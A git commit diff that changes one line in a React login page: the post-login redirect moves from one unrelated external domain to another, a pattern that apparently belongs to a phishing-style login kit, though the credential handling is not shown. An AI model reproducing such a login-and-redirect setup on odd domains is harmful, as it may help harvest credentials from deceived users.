dfc4bc5be78bab3ccbb1f90d101df9142b058d27
husknet <127146284+husknet@users.noreply.github.com>
2025-06-13 11:08:14 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://best.royaldoorltdl.com/';
+      window.location.href = 'https://igbo.leah-mustafa.shop/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
